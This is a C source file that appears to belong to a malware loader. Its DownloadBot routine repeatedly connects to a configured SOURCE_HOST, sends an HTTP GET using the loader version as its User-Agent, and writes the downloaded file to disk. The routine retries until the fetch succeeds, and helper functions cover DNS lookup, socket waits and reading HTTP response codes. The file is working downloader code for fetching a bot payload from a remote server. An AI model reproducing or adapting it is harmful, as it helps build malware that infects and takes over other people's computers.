#include "loader.h"

#ifdef DOWNLOAD
/* ------------------------------------------------------------------------------*/
int DnsResolve(char* Host) 
{
	DWORD addr;
	struct hostent *he;

	addr = inet_addr(Host);

	if(addr != INADDR_NONE)
		return addr;

	he = gethostbyname((char FAR*) Host);
	
	if(he == NULL) 
	{
		deb("resolve error: %d",WSAGetLastError());
		return -1;
	}

	addr = ((struct in_addr *) (he->h_addr_list[0]))->s_addr;

	return addr;
}
/* ------------------------------------------------------------------------------*/
void DownloadBot(char *path)
{
	SOCKADDR_IN sin;
	SOCKET s = NULL;
	WSADATA wsaData;
	HANDLE file = NULL;
	int done = 0;
	char buf[BUF_SIZE];
	DWORD bytes = 0,written = 0;
	int iResult;
	char source_file[128];
	char source_host[128];
	char loader_version[255];
	
	strncpy(source_file, SOURCE_FILE, sizeof(source_file));
	strncpy(loader_version, LOADER_VERSION, sizeof(loader_version));
	strncpy(source_host, SOURCE_HOST, sizeof(source_host));

	while(!done) 
	{
		deb("entered download cycle");
		deb("source_host: %s", source_host);
		deb("loader_version: %s", loader_version);
		deb("source_file: %s", source_file);

		Sleep(100);
		if(file && file != INVALID_HANDLE_VALUE)
			CloseHandle(file);

		if(s && s != INVALID_SOCKET)
			closesocket(s);

		file = CreateFile(path,GENERIC_ALL,0,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
		if(file == INVALID_HANDLE_VALUE) 
		{
			deb("DownloadFile: failed to create file %s\n", fmterr());
			continue;
		}
		iResult = WSAStartup(MAKEWORD(2,2), &wsaData);

		sin.sin_family = AF_INET;
		sin.sin_port = htons(SOURCE_PORT);

		if(DnsResolve(source_host) == -1)
			continue;
		
		sin.sin_addr.s_addr = DnsResolve(source_host);

		s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
		if (s == INVALID_SOCKET) 
		{
			deb("socket: %s", fmterr());
			continue;
		}

		if(connect( s, (SOCKADDR*) &sin, sizeof(sin) ) == SOCKET_ERROR) 
		{

			deb("connect: %s\n",fmterr());
			continue;
		}
		wsprintf(buf,"GET %s HTTP/1.0\r\n"
			     "User-Agent: %s\r\n"
			     "Host: %s\r\n\r\n",source_file, loader_version, source_host);

		int res = send(s,buf,lstrlen(buf),0);
		if(res == SOCKET_ERROR) 
		{
			deb("res == SOCKET_ERROR after send()");
			continue;
		}

		int code = GetHTTPRespCode(s);
		if(code != 200) 
		{
			deb("code: %d",code);
			continue;
		}
		while(ready(s,HTTP_TIMEOUT) == 0) 
		{
			res = recv(s,buf,BUF_SIZE,0);

			if(res == SOCKET_ERROR)
				break;

			if(res == 0)
			{
				done = 1;
				closesocket(s);
				CloseHandle(file);
				break;
			}

			bytes += res;

			WriteFile(file,buf,res,&written,NULL);

			if(written != (DWORD) res)
				break;
		}
	}
	deb("done. read %lu bytes.\n",bytes);
}
/* ------------------------------------------------------------------------------*/
int ready(SOCKET Socket,WORD timeout)
{
    fd_set          fds;
    struct timeval  tm;
	int dwResult;

    memset(&tm, 0x0,sizeof(tm));
    tm.tv_sec = timeout;
    FD_ZERO(&fds);
    FD_SET(Socket, &fds);
	
    if ( (dwResult = select(Socket + 1, &fds, NULL, NULL, &tm)) > 0) 
	{
		if(FD_ISSET(Socket,&fds))
			return 0;
    }
	if(dwResult == SOCKET_ERROR)
		return SOCKET_ERROR;

    return -1;
}
/* ------------------------------------------------------------------------------*/
int GetHTTPRespCode(SOCKET s)
{
	char buf[1024],*p;
	int res,bytes = 0;
	int code = 0;

	p = buf;

	do 
	{
		if(bytes++ > 6) 
			if( memcmp( p-4 , "\r\n\r\n" , 4 ) == 0 )
				break;
		res = recv(s,p++,1,0);
		if(res == 0) 
			return -1;
	} while( bytes < 1023 );

	deb("HEADER: %s\n",buf);
	if( ( p = strstr( buf , "HTTP/" ) ) == NULL ) 
	{
		deb("no http header\n");
		return -1;
	}

	code = atoi(p + 9);
	return code;
}
#endif /* DOWNLOAD */